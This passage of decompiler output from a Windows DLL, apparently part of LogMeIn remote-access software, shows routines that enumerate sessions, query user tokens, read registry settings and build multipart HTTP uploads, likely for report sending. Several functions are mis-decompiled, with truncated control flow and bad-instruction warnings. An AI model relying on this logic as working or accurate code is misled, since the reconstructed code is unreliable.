  DAT_1009b574 = (*unaff_ESI)(DAT_1009b560,"GetModuleBaseNameW");
  _DAT_1009b578 = (*unaff_ESI)(DAT_1009b560,"GetProcessImageFileNameW");
  return &DAT_1009b560;
}



/* Function: FUN_1001ad70 */

undefined4 * FUN_1001ad70(void)

{
  if ((DAT_1009b57c & 1) == 0) {
    DAT_1009b57c = DAT_1009b57c | 1;
    DAT_1009b580 = 0;
    DAT_1009b580 = FUN_10422e2f();
    FUN_10057b51(&LAB_10078560);
  }
  return &DAT_1009b580;
}



/* Function: FUN_1001adb0 */

void FUN_1001adb0(void)

{
  int iVar1;
  
  DAT_1009b588 = 0;
  DAT_1009b58c = 0;
  DAT_1009b590 = 0;
  iVar1 = FUN_10496133("userenv.dll");
                    /* WARNING: Could not recover jumptable at 0x1001add8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (**(code **)(iVar1 + 0x70))();
  return;
}



/* Function: FUN_1001ae10 */

void FUN_1001ae10(void)

{
  if ((DAT_1009b584 & 1) == 0) {
    DAT_1009b584 = DAT_1009b584 | 1;
    FUN_1001adb0();
    FUN_10057b51(&LAB_10078580);
  }
  if (DAT_1009b590 == (code *)0x0) {
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x1001ae44. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_1009b590)();
  return;
}



/* Function: FUN_1001ae50 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_1001ae50(void)

{
  undefined4 uVar1;
  byte extraout_DL;
  code *unaff_ESI;
  
  DAT_1009b598 = (byte *)0x0;
  _DAT_1009b59c = 0;
  DAT_1009b5a0 = 0;
  DAT_1009b5a4 = 0;
  DAT_1009b5a8 = 0;
  FUN_10361c23("wtsapi32.dll");
  uVar1 = FUN_1014184d();
  DAT_1009b598 = (byte *)CONCAT31((int3)((uint)uVar1 >> 8),0x44);
  *DAT_1009b598 = *DAT_1009b598 | extraout_DL;
  _DAT_1009b59c = (*unaff_ESI)(DAT_1009b598);
  DAT_1009b5a0 = (*unaff_ESI)(DAT_1009b598,"WTSFreeMemory");
  DAT_1009b5a4 = (*unaff_ESI)(DAT_1009b598,"WTSEnumerateProcessesW");
  DAT_1009b5a8 = (*unaff_ESI)(DAT_1009b598,"WTSQueryUserToken");
  return &DAT_1009b598;
}



/* Function: FUN_1001aef0 */

/* WARNING: Instruction at (ram,0x1001af30) overlaps instruction at (ram,0x1001af2c)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

code * __fastcall FUN_1001aef0(code *param_1)

{
  byte bVar1;
  undefined4 uVar2;
  int iVar3;
  undefined3 uVar7;
  char *pcVar5;
  undefined4 *puVar6;
  undefined4 extraout_ECX;
  int iVar8;
  code *pcVar9;
  code *unaff_EDI;
  char cVar10;
  char cVar11;
  code *local_8;
  byte *pbVar4;
  
  cVar11 = '\0';
  iVar8 = -1;
  cVar10 = '\x01';
  local_8 = param_1;
  uVar2 = FUN_100075b0();
  *(undefined4 *)param_1 = uVar2;
  FUN_100075b0();
  iVar3 = FUN_1019d24b();
  if (cVar11 != cVar10) {
    while( true ) {
      uVar7 = (undefined3)((uint)iVar3 >> 8);
      bVar1 = (char)iVar3 - 0x39;
      pbVar4 = (byte *)CONCAT31(uVar7,bVar1);
      *pbVar4 = *pbVar4 | bVar1;
      *pbVar4 = *pbVar4 + bVar1;
      iVar8 = CONCAT22((short)((uint)iVar8 >> 0x10),
                       CONCAT11((char)((uint)iVar8 >> 8) + bVar1,(char)iVar8));
      pcVar9 = param_1 + 3;
      pcVar5 = (char *)CONCAT31(uVar7,bVar1);
      *pcVar5 = *pcVar5 + bVar1;
      if ((pcVar5 != (char *)0x0) && (0x27 < *(uint *)(pcVar5 + 8))) break;
      uVar2 = (*unaff_EDI)();
      iVar3 = FUN_10007280(uVar2,extraout_ECX);
      *(int *)pcVar9 = iVar3;
      iVar3 = *(int *)pcVar9;
      param_1 = pcVar9;
    }
    puVar6 = (undefined4 *)FUN_1000e760(&local_8,0,0x28);
    iVar3 = FUN_10007010(*puVar6);
    *(int *)pcVar9 = iVar3;
    if (local_8 != (code *)0x0) {
      LOCK();
      iVar3 = *(int *)local_8;
      *(int *)local_8 = *(int *)local_8 + iVar8;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_8);
      }
    }
    iVar3 = *(int *)pcVar9;
    if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
      uVar2 = FUN_10007b60(iVar3 + 0xc,*(undefined4 *)(iVar3 + 8));
      *(undefined4 *)(param_1 + 7) = uVar2;
    }
    return pcVar9;
  }
  _DAT_1009b59c = iVar3;
  DAT_1009b5a0 = (*param_1)(DAT_1009b598);
  DAT_1009b5a4 = (*param_1)(DAT_1009b598,"WTSEnumerateProcessesW");
  DAT_1009b5a8 = (*param_1)(DAT_1009b598,"WTSQueryUserToken");
  return (code *)&DAT_1009b598;
}



/* Function: FUN_1001afb0 */

void __thiscall FUN_1001afb0(int *param_1,int *param_2,int *param_3,int *param_4)

{
  int iVar1;
  
  iVar1 = FUN_10007b60(&DAT_10084530,0xffffffff);
  param_1[2] = iVar1;
  iVar1 = *param_1;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    iVar1 = FUN_10007b60(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    param_1[2] = iVar1;
  }
  iVar1 = FUN_10007b60(&DAT_10084534,0xffffffff);
  param_1[2] = iVar1;
  iVar1 = FUN_10007b60("Content-Disposition: form-data; name=\"",0xffffffff);
  param_1[2] = iVar1;
  iVar1 = *param_3;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    iVar1 = FUN_10007b60(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    param_1[2] = iVar1;
  }
  iVar1 = FUN_10007b60("\"; filename=\"",0xffffffff);
  param_1[2] = iVar1;
  iVar1 = *param_4;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    iVar1 = FUN_10007b60(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    param_1[2] = iVar1;
  }
  iVar1 = FUN_10007b60(&DAT_10084570,0xffffffff);
  param_1[2] = iVar1;
  iVar1 = FUN_10007b60("Content-Type: application/octet-stream\r\n",0xffffffff);
  param_1[2] = iVar1;
  iVar1 = FUN_10007b60(&DAT_10084534,0xffffffff);
  param_1[2] = iVar1;
  iVar1 = *param_2;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    iVar1 = FUN_10007b60(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    param_1[2] = iVar1;
  }
  iVar1 = FUN_10007b60(&DAT_10084534,0xffffffff);
  param_1[2] = iVar1;
  return;
}



/* Function: FUN_1001b0d0 */

undefined4 FUN_1001b0d0(int *param_1)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  
  iVar2 = *param_1;
  if (iVar2 != 0) {
    pcVar3 = (char *)(iVar2 + 0xc);
    if (pcVar3 != (char *)0x0) {
      do {
        cVar1 = *pcVar3;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      iVar4 = (int)pcVar3 - (iVar2 + 0xd);
      *(int *)(iVar2 + 8) = iVar4;
      *(undefined1 *)(iVar4 + 0xc + iVar2) = 0;
      return 1;
    }
    *(undefined4 *)(iVar2 + 8) = 0;
    *(undefined1 *)(iVar2 + 0xc) = 0;
  }
  return 1;
}



/* Function: FUN_1001b120 */

/* WARNING: Control flow encountered bad instruction data */

void __fastcall
FUN_1001b120(char *param_1,char *param_2,int param_3,int param_4,undefined2 *param_5)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  byte *pbVar4;
  code *pcVar5;
  int iVar6;
  uint uVar7;
  char *pcVar8;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  int unaff_EBX;
  bool bVar9;
  undefined1 uVar10;
  char *pcVar11;
  undefined4 uVar12;
  undefined4 local_354;
  undefined1 local_330 [8];
  undefined4 local_328;
  undefined *local_324;
  char *local_320;
  int *local_31c;
  undefined4 local_318;
  uint local_314;
  char local_310;
  undefined1 local_30f [511];
  char local_110 [128];
  undefined1 local_90;
  undefined1 local_8f [31];
  char local_70;
  undefined4 local_6f;
  undefined4 uStack_6b;
  undefined4 uStack_67;
  undefined4 uStack_63;
  undefined8 local_5f;
  undefined4 local_57;
  undefined2 local_53;
  undefined1 local_51;
  char local_4c [12];
  undefined2 local_40;
  undefined8 local_3e;
  undefined4 local_36;
  undefined2 local_32;
  undefined1 local_30;
  undefined8 local_2f;
  undefined4 local_27;
  undefined2 local_23;
  undefined1 local_21;
  char local_20;
  undefined4 local_1f;
  undefined2 local_1b;
  undefined1 local_19;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007522c;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((param_1 == (char *)0x0) || (*param_1 != '\0')) {
    piVar2 = (int *)FUN_100075b0(local_18);
  }
  else {
    piVar2 = (int *)FUN_10007ae0();
  }
  local_8 = 1;
  local_31c = piVar2;
  local_31c = (int *)FUN_100074a0(0,1);
  if (local_31c == (int *)0x0) {
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar2;
      *piVar2 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar2);
      }
      if (local_31c != (int *)0x0) goto LAB_1001b1e8;
    }
    piVar2 = (int *)0x0;
  }
  else {
LAB_1001b1e8:
    piVar2 = local_31c + 3;
  }
  local_328 = 0;
  local_318 = 0;
  local_70 = '\0';
  local_57 = 0;
  local_53 = 0;
  *param_5 = 0;
  local_51 = 0;
  local_314 = 0;
  local_5f = 0;
  local_6f = 0;
  uStack_6b = 0;
  uStack_67 = 0;
  uStack_63 = 0;
  cVar1 = (char)*piVar2;
  while (cVar1 != '\0') {
    if (cVar1 == ':') goto LAB_1001b25a;
    if (local_314 < 0x1f) {
      (&local_70)[local_314] = cVar1;
    }
    piVar2 = (int *)((int)piVar2 + 1);
    local_314 = local_314 + 1;
    cVar1 = *(char *)piVar2;
  }
  for (; ((char)*piVar2 == ':' || ((char)*piVar2 == '/')); piVar2 = (int *)((int)piVar2 + 1)) {
LAB_1001b25a:
  }
  local_110[0] = '\0';
  FUN_1005ff60(local_110 + 1,0,0x7f);
  local_314 = 0;
  cVar1 = (char)*piVar2;
  uVar7 = local_314;
  while (((cVar1 != '\0' && (cVar1 != ':')) && (cVar1 != '/'))) {
    if (uVar7 < 0x7f) {
      local_110[uVar7] = cVar1;
    }
    piVar2 = (int *)((int)piVar2 + 1);
    uVar7 = uVar7 + 1;
    cVar1 = *(char *)piVar2;
  }
  local_20 = '\0';
  local_1f = 0;
  local_1b = 0;
  local_19 = 0;
  local_314 = uVar7;
  if ((char)*piVar2 == ':') {
    do {
      piVar2 = (int *)((int)piVar2 + 1);
    } while (*(char *)piVar2 == ':');
    local_314 = 0;
    cVar1 = *(char *)piVar2;
    uVar7 = CONCAT31((int3)(uVar7 >> 8),cVar1);
    while (cVar1 != '\0') {
      if ((char)uVar7 == '/') goto LAB_1001b342;
      if (local_314 < 7) {
        (&local_20)[local_314] = (char)uVar7;
      }
      piVar2 = (int *)((int)piVar2 + 1);
      local_314 = local_314 + 1;
      cVar1 = *(char *)piVar2;
      uVar7 = CONCAT31((int3)(uVar7 >> 8),cVar1);
    }
LAB_1001b2f0:
    uVar12 = 0x2ee5;
  }
  else {
LAB_1001b342:
    if ((char)*piVar2 == '\0') goto LAB_1001b2f0;
    iVar3 = FUN_10041e40(uVar7);
    pbVar4 = (byte *)FUN_10041e40();
    if ((iVar3 != 0) || (pbVar4 != (byte *)0x0)) {
      pcVar8 = (char *)0x50;
      if (pbVar4 != (byte *)0x0) {
        pcVar8 = (char *)0x1bb;
      }
      uVar10 = local_20 == '\0';
      while( true ) {
        local_320 = pcVar8;
        if (!(bool)uVar10) {
          uVar7 = FUN_1005a556(&local_20);
          local_320 = (char *)(uVar7 & 0xffff);
        }
        local_324 = &DAT_100845b8;
        if (param_3 == 0) {
          local_324 = &DAT_100845c0;
        }
        iVar3 = FUN_101734bd("LogMeIn Guardian",0,0,0,0);
        bVar9 = false;
        uVar10 = iVar3 == 0;
        if ((bool)uVar10) break;
        pcVar8 = (char *)FUN_10342fb3(iVar3,local_110,local_320,0,0,3,0,0,iVar3);
        if (!bVar9) {
          *pbVar4 = *pbVar4 >> 4 | *pbVar4 << 4;
          *pcVar8 = *pcVar8 + (char)pcVar8;
          pcVar11 = pcVar8;
          iVar3 = FUN_102ea83f(pcVar8,pcVar8,local_324,piVar2,0,0,0,
                               -(uint)(pbVar4 != (byte *)0x0) & 0x800000 | 0x84243300,0);
          local_320 = (char *)iVar3;
          if (iVar3 == 0) {
            FUN_1035767d();
            FUN_1034cbdf(local_354);
                    /* WARNING: Bad instruction - Truncating control flow here */
            halt_baddata();
          }
          local_310 = '\0';
          FUN_1005ff60(local_30f,0,0x1ff);
          if (param_2 != (char *)0x0) {
            _strcat_s(&local_310,0x200,"Content-Type: ");
            _strcat_s(&local_310,0x200,param_2);
            _strcat_s(&local_310,0x200,"\r\n");
          }
          if (param_4 != 0) {
            _strcat_s(&local_310,0x200,"Content-Length: ");
            FUN_1005a469(param_4,local_4c,10,10);
            _strcat_s(&local_310,0x200,local_4c);
            _strcat_s(&local_310,0x200,"\r\n");
          }
          while( true ) {
            pcVar5 = (code *)FUN_100d4088(iVar3,&local_310,0xffffffff,param_3,param_4);
            if (pcVar5 != (code *)0x0) {
              FUN_1043dcdc(pcVar8,pcVar11);
              iVar3 = iVar3 + 1;
              local_30 = 0;
              local_27 = 0;
              local_2f = 0;
              local_23 = 0;
              local_21 = 0;
              local_314 = 0x10;
              (*pcVar5)(iVar3,0x13,&local_30,&local_314,0);
              local_90 = 0;
              FUN_1005ff60(local_8f,0,0x3f);
              local_314 = 0x40;
              (*pcVar5)(iVar3,0x14,&local_90,&local_314,0);
              local_36 = 0;
              local_40 = 0x3f;
              local_3e = 0;
              local_32 = 0;
              local_314 = 0x10;
              (*pcVar5)(iVar3,5,&local_40,&local_314,0);
              uVar12 = FUN_100581b4(0x400);
              local_314 = 0;
              FUN_103b14cc(local_320,uVar12,0x400,&local_328);
                    /* WARNING: Bad instruction - Truncating control flow here */
              halt_baddata();
            }
            iVar6 = FUN_105f6d82(iVar3);
            if (iVar6 == 0x2f0d) break;
            if ((iVar6 != 0x2f19) || (iVar6 = FUN_1001bc70(), iVar6 == 0)) {
              uVar12 = FUN_104fcee4();
              FUN_1017de11(uVar12,iVar3);
              FUN_105e1cbe(local_354);
              uVar10 = in(extraout_DX);
              *(undefined1 *)(unaff_EBX + 4) = uVar10;
              FUN_1022aad0(unaff_EBX + 5);
                    /* WARNING: Bad instruction - Truncating control flow here */
              halt_baddata();
            }
          }
          local_324 = (undefined *)0x4;
          FUN_102339c8(iVar3,0x1f,local_330,&local_324);
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
      }
      uVar12 = FUN_105d2c15();
      FUN_104ec9d7(uVar12);
      in(extraout_DX_00);
      goto LAB_1001b2fd;
    }
    uVar12 = 0x2ee6;
    local_320 = (char *)0x0;
  }
  FUN_1031fc93(piVar2,uVar12);
LAB_1001b2fd:
  FUN_1001bd70();
  if (local_31c != (int *)0x0) {
    LOCK();
    iVar3 = *local_31c;
    *local_31c = *local_31c + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_31c);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1001bc70 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int __fastcall FUN_1001bc70(undefined4 param_1,int param_2)

{
  undefined4 in_EAX;
  undefined4 uVar1;
  int iVar2;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_SS;
  undefined1 uVar3;
  undefined2 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  uint *puVar7;
  undefined4 *puVar8;
  undefined4 uVar9;
  int iVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 local_c;
  uint local_8;
  
  uVar3 = &stack0x00000000 == (undefined1 *)0xc;
  uVar12 = 0;
  uVar11 = 7;
  uVar9 = param_1;
  iVar10 = param_2;
  uVar1 = FUN_106761ee();
  iVar2 = FUN_104e7ded(uVar1);
  _DAT_00002f00 = param_1;
  if ((!(bool)uVar3) && (iVar2 != 0)) {
    return 0;
  }
  if (param_2 != 0x2f19) {
    return 1;
  }
  puVar8 = &local_c;
  local_c = 4;
  puVar7 = &local_8;
  uVar6 = 0x1f;
  uVar4 = 0x1001;
  uVar5 = param_1;
  iVar2 = FUN_104ac522(param_1,0x1f,puVar7,puVar8);
  if (iVar2 != 0) {
    local_8 = local_8 | 0x80;
    iVar2 = FUN_103adcce(param_1,param_1,0x1f,&local_8,local_c,CONCAT22(uVar4,in_SS),uVar5,uVar6,
                         puVar7,puVar8,uVar1,in_EAX,uVar9,iVar10,uVar11,uVar12,unaff_EDI,unaff_ESI);
    if (iVar2 != 0) {
      return iVar2;
    }
  }
  FUN_104c9674();
  return iVar2;
}



/* Function: FUN_1001bd00 */

undefined4 * __thiscall FUN_1001bd00(undefined4 *param_1,uint param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  
  if (((param_2 == 0) || (param_2 == 0)) || (param_2 == 1)) {
    *param_1 = 0;
    return param_1;
  }
  uVar2 = 0x10;
  if (0x10 < param_2) {
    uVar2 = param_2;
  }
  uVar2 = uVar2 + 0xf & 0xfffffff0;
  puVar1 = (undefined4 *)FUN_100581b4(uVar2 + 0xf);
  if (puVar1 == (undefined4 *)0x0) {
    *param_1 = 0;
    return param_1;
  }
  puVar1[1] = uVar2;
  *puVar1 = 0;
  puVar1[2] = 0;
  *(undefined1 *)(puVar1 + 3) = 0;
  *param_1 = puVar1;
  return param_1;
}



/* Function: FUN_1001bd70 */

void __fastcall FUN_1001bd70(int *param_1)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  
  if (((int *)*param_1 != (int *)0x0) && (iVar2 = *(int *)*param_1, iVar2 != 0)) {
    pcVar3 = (char *)(iVar2 + 0xc);
    if (pcVar3 != (char *)0x0) {
      do {
        cVar1 = *pcVar3;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      iVar4 = (int)pcVar3 - (iVar2 + 0xd);
      *(int *)(iVar2 + 8) = iVar4;
      *(undefined1 *)(iVar4 + 0xc + iVar2) = 0;
      return;
    }
    *(undefined4 *)(iVar2 + 8) = 0;
    *(undefined1 *)(iVar2 + 0xc) = 0;
  }
  return;
}



/* Function: FUN_1001bdb0 */

undefined4 * __fastcall FUN_1001bdb0(undefined4 *param_1)

{
  param_1[4] = 0xb;
  *(undefined2 *)(param_1 + 0xb) = 0x50;
  *param_1 = 0;
  param_1[1] = &DAT_100846a8;
  param_1[0xc] = 0;
  param_1[3] = 0;
  param_1[2] = 0;
  param_1[5] = 10000;
  param_1[6] = 0x1000;
  param_1[7] = 0x1000;
  param_1[0xd] = 0;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  return param_1;
}



/* Function: FUN_1001be20 */

undefined4 * __thiscall FUN_1001be20(undefined4 *param_1,int *param_2)

{
  undefined1 uVar1;
  char cVar2;
  uint uVar3;
  undefined4 uVar4;
  int *piVar5;
  int iVar6;
  int iVar7;
  undefined1 local_20 [4];
  undefined1 local_1c [4];
  int local_18;
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  piVar5 = DAT_1009abd0;
  puStack_c = &LAB_100752a9;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = DAT_1009abd0;
  if (piVar5 != (int *)0x0) {
    LOCK();
    *piVar5 = *piVar5 + 1;
    UNLOCK();
  }
  piVar5 = DAT_1009abd4;
  param_1[1] = DAT_1009abd4;
  if (piVar5 != (int *)0x0) {
    LOCK();
    *piVar5 = *piVar5 + 1;
    UNLOCK();
  }
  local_8 = 1;
  uStack_7 = 0;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0(uVar3);
    FUN_10057b51(&LAB_10078190);
  }
  param_1[2] = &DAT_100990d8;
  param_1[3] = 0;
  param_1[4] = 0;
  uVar4 = FUN_10017840();
  param_1[3] = uVar4;
  local_8 = 2;
  param_1[5] = 0;
  param_1[6] = 0;
  uVar4 = FUN_10017840();
  param_1[5] = uVar4;
  local_8 = 3;
  uVar1 = local_8;
  local_8 = 3;
  param_1[7] = param_2;
  param_1[8] = 0;
  switch(param_2) {
  case (int *)0x2:
    uVar4 = FUN_10010440(DAT_1009abc8);
    *param_1 = uVar4;
    iVar6 = DAT_1009abcc;
    break;
  case (int *)0x3:
    uVar4 = FUN_10010440(DAT_1009abd8);
    *param_1 = uVar4;
    iVar6 = DAT_1009abdc;
    break;
  case (int *)0x4:
    uVar4 = FUN_10010440(DAT_1009abe0);
    *param_1 = uVar4;
    iVar6 = DAT_1009abe4;
    break;
  case (int *)0x5:
    uVar4 = FUN_10010440(DAT_1009ac14);
    *param_1 = uVar4;
    uVar4 = FUN_10010440(DAT_1009ac14);
    param_1[1] = uVar4;
    param_1[8] = 2;
    param_2 = (int *)0x0;
    local_8 = 4;
    if (DAT_1009abf0 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = DAT_1009abf0 + 0xc;
    }
    iVar6 = FUN_1001cd20(0x80000002,iVar6,L"ExePath",&param_2,0);
    piVar5 = param_2;
    if (iVar6 != 0) {
      FUN_10021a40(0,1);
      FUN_1000ace0(local_1c);
      FUN_1000c820(0);
      local_14 = 0;
      local_8 = 7;
      iVar6 = FUN_1000c520(&local_14);
      piVar5 = param_2;
      if (iVar6 != 0) {
        piVar5 = (int *)FUN_10010440(local_14);
      }
      if (piVar5 != (int *)0x0) {
        LOCK();
        *piVar5 = *piVar5 + 1;
        UNLOCK();
      }
      param_2 = piVar5;
      FUN_1000c820(0);
      FUN_10019e10(local_20);
      if (local_18 == 0) {
        local_18 = 0;
      }
      else {
        local_18 = local_18 + 0xc;
      }
      cVar2 = FUN_1000e6a0(local_18);
      FUN_10006f30();
      if (cVar2 != '\0') {
        uVar4 = FUN_10010440(DAT_1009abf0);
        *param_1 = uVar4;
        uVar4 = FUN_10010440(DAT_1009abf4);
        param_1[1] = uVar4;
        param_1[8] = 1;
      }
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
    }
    if (piVar5 == (int *)0x0) {
      ExceptionList = local_10;
      return param_1;
    }
    LOCK();
    iVar6 = *piVar5;
    *piVar5 = iVar6 + -1;
    UNLOCK();
    if (-1 < iVar6 + -1) {
      ExceptionList = local_10;
      return param_1;
    }
    FUN_100579ee(piVar5);
    ExceptionList = local_10;
    return param_1;
  case (int *)0x6:
    local_8 = uVar1;
    uVar4 = FUN_10010440(DAT_1009abec);
    param_1[1] = uVar4;
    if (DAT_1009abec == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = DAT_1009abec + 0xc;
    }
    iVar6 = FUN_1001cf10(0x80000001,iVar6,L"PromptOrSendOrNever",0xffffffff,0,0);
    if (iVar6 != -1) {
      ExceptionList = local_10;
      return param_1;
    }
    if (DAT_1009abe8 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = DAT_1009abe8 + 0xc;
    }
    iVar7 = FUN_1001cf10(0x80000001,iVar6,L"PromptOrSendOrNever",0xffffffff,0,0);
    iVar6 = DAT_1009abe8;
    if (iVar7 == -1) {
      ExceptionList = local_10;
      return param_1;
    }
    break;
  case (int *)0x7:
    local_8 = uVar1;
    uVar4 = FUN_10010440(DAT_1009ac08);
    *param_1 = uVar4;
    iVar6 = DAT_1009ac08;
    break;
  case (int *)0x8:
    local_8 = uVar1;
    uVar4 = FUN_10010440(DAT_1009abf8);
    *param_1 = uVar4;
    iVar6 = DAT_1009abfc;
    break;
  case (int *)0x9:
    local_8 = uVar1;
    uVar4 = FUN_10010440(DAT_1009ac00);
    *param_1 = uVar4;
    iVar6 = DAT_1009ac04;
    break;
  case (int *)0xa:
    local_8 = uVar1;
    uVar4 = FUN_10010440(DAT_1009ac0c);
    *param_1 = uVar4;
    iVar6 = DAT_1009ac10;
    break;
  default:
    goto switchD_1001befb_default;
  }
  uVar4 = FUN_10010440(iVar6);
  param_1[1] = uVar4;
switchD_1001befb_default:
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001c1e0 */

void __fastcall FUN_1001c1e0(undefined4 *param_1)

{
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_1001d280(&local_8,*(undefined4 *)*param_1,(undefined4 *)*param_1);
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_1001c210 */

void __fastcall FUN_1001c210(undefined4 *param_1)

{
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_1001d3f0(&local_8,*(undefined4 *)*param_1,(undefined4 *)*param_1);
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_1001c240 */

void __thiscall FUN_1001c240(int param_1,undefined4 param_2,int *param_3)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  int **ppiVar4;
  int iVar5;
  int **local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_100752e0;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  piVar3 = (int *)FUN_1000bfa0(L"PromptOrSendOrNever",0xffffffff);
  if (((piVar3 == (int *)0x0) || (piVar3 + 3 == (int *)0x0)) || ((short)piVar3[3] != 0)) {
    local_14 = (int *)FUN_1000bd10(uVar2);
  }
  else {
    local_14 = (int *)FUN_1000ba60();
  }
  local_18 = (int *)(param_1 + 0xc);
  local_8 = CONCAT31(local_8._1_3_,1);
  ppiVar4 = (int **)FUN_1001d340(&local_14);
  if ((ppiVar4 == (int **)*local_18) || (cVar1 = FUN_1001d1f0(&local_14,ppiVar4 + 4), cVar1 != '\0')
     ) {
    local_1c = &local_14;
    iVar5 = FUN_1001daa0(&local_1c,&local_1c,local_1c);
    FUN_1001dae0(&local_1c,ppiVar4,iVar5 + 0x10,iVar5);
    ppiVar4 = local_1c;
  }
  ppiVar4[5] = param_3;
  local_8 = local_8 & 0xffffff00;
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar5 = *local_14;
    *local_14 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  if (*(int *)(param_1 + 0x20) != 2) {
    if (*(int *)(param_1 + 4) == 0) {
      iVar5 = 0;
    }
    else {
      iVar5 = *(int *)(param_1 + 4) + 0xc;
    }
    FUN_1001cf10(0x80000001,iVar5,L"PromptOrSendOrNever",param_3,1,1);
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar5 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1001c390 */

int __thiscall FUN_1001c390(int *param_1,int *param_2,int param_3,int *param_4,undefined4 *param_5)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  int *piVar7;
  undefined4 *puVar8;
  int iVar9;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  piVar4 = param_2;
  puStack_c = &LAB_10075338;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (param_1[8] != 2) {
    local_8 = 0;
    local_14 = param_1;
    piVar3 = (int *)FUN_1000bfa0(param_2,0xffffffff);
    if (piVar3 == (int *)0x0) {
      local_18 = (int *)0x0;
    }
    else {
      local_18 = piVar3 + 3;
    }
    iVar9 = param_1[2];
    if ((((*(int *)(iVar9 + 0x54) == 0) || (*(int *)(iVar9 + 0x50) == 0)) ||
        (*(int *)(iVar9 + 0x34) == 0)) || (*(int *)(iVar9 + 0x4c) == 0)) {
      if ((local_18 == (int *)0x0) || ((short)*local_18 != 0)) {
        param_2 = (int *)FUN_1000bd10(uVar2);
      }
      else {
        param_2 = (int *)FUN_1000ba60();
      }
      param_4 = local_14 + 3;
      local_8 = CONCAT31(local_8._1_3_,1);
      puVar8 = (undefined4 *)FUN_1001d340(&param_2);
      if ((puVar8 == (undefined4 *)*param_4) ||
         (cVar1 = FUN_1001d1f0(&param_2,puVar8 + 4), cVar1 != '\0')) {
        param_5 = &param_2;
        iVar9 = FUN_1001daa0(&param_5,&param_5,param_5);
        FUN_1001dae0(&param_5,puVar8,iVar9 + 0x10,iVar9);
        puVar8 = param_5;
      }
      puVar8[5] = param_3;
      iVar9 = param_3;
      if (param_2 != (int *)0x0) {
        LOCK();
        iVar6 = *param_2;
        *param_2 = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(param_2);
          iVar9 = param_3;
        }
      }
LAB_1001c6c6:
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar6 = *piVar3;
        *piVar3 = *piVar3 + -1;
        UNLOCK();
